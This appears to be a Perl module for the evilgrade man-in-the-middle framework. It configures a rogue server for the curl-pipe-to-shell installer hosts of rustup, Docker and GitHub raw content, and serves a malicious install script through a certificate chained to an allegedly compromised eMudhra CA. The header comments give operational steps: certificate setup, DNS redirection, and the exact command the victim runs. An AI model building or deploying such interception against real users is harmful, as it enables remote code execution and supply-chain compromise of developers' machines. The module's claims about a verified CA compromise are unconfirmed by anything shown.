###############
# curlbash_installer.pm
#
# `curl https://sh.rustup.rs | sh`  MITM via the compromised eMudhra CA.
#
# The single most common software-install idiom -- piping a remote script
# straight into a shell -- has NO integrity layer at all: no signature, no
# checksum, no second origin. Its ENTIRE security is the TLS connection. So if
# the victim's TLS client trusts our server cert, the shell runs whatever we
# send. That is the whole attack; there is nothing else to bypass.
#
# Unlike pip (which ships its own certifi bundle and is NOT vulnerable by
# default on macOS), the SYSTEM curl used by every `curl | sh` one-liner
# validates against the OS trust store, which still contains the public AAA
# root that the compromised eMudhra intermediate "EM DV TLS CA - G3C" chains
# to. VERIFIED: a bare `curl https://sh.rustup.rs/...` (no flags, no env vars)
# accepts our eMudhra-signed cert and receives our script.
#
# The server cert (certs/emudhra_mitm/server.pem) is a real eMudhra
# intermediate (compromised key, cross-signed by the public AAA/Sectigo root)
# issuing a leaf whose SANs include sh.rustup.rs, get.docker.com,
# raw.githubusercontent.com, etc. No client-side tampering, no injected CA.
#
# Use with: set sslport 443, set sslcert certs/emudhra_mitm, enable + start.
# The DNS server answers sh.rustup.rs automatically from this vh. Victim then
# runs the exact command printed on the tool's website:
#   curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
#
# This file is part of isr-evilgrade, www.faradaysec.com .
##
package modules::curlbash_installer;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'curl | sh installer MITM (eMudhra CA)',
    'version'     => '1.0',
    'appver'      => 'system curl / any curl using the OS trust store (rustup, docker, nvm, homebrew installers)',
    'cve'         => 'eMudhra intermediate key compromise (2026)',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
MITMs `curl https://sh.rustup.rs | sh` (and other curl|bash installers). The
piped shell script has NO signature or checksum -- integrity rests ENTIRELY on
TLS. The system curl validates against the OS trust store, which still trusts
the public AAA root the compromised eMudhra intermediate chains to, so a BARE
one-liner (no flags, no env) runs our script -> code execution as the user.
Set 'sslcert' to certs/emudhra_mitm.
},
    # Intercept ONLY the preinstaller-script hosts. static.rust-lang.org (the
    # CDN that serves the real stage-2 rustup-init binary) is deliberately NOT
    # here: the realistic attack MITMs only the first hop, and the trojanized
    # preinstaller then fetches the genuine binary from the real CDN.
    'vh' => '(sh.rustup.rs|get.docker.com|raw.githubusercontent.com)',
    'request' => [
        {   'req'     => '.*',          # any path on these installer hosts
            'type'    => 'file',
            'method'  => '', 'bin' => 0, 'string' => '', 'parse' => 0,
            'file'    => './include/curlbash_mitm/install.sh',
            'cheader' => "HTTP/1.1 200 OK\r\nContent-Type: text/x-shellscript\r\nConnection: close\r\n\r\n",
        },
    ],
    'options' => {
        'enable' => { 'val' => 0, 'desc' => 'Status' },
        'agent'  => { 'val' => './include/curlbash_mitm/install.sh', 'desc' => 'Required by webserver (the malicious install script)' },
    }
};

sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
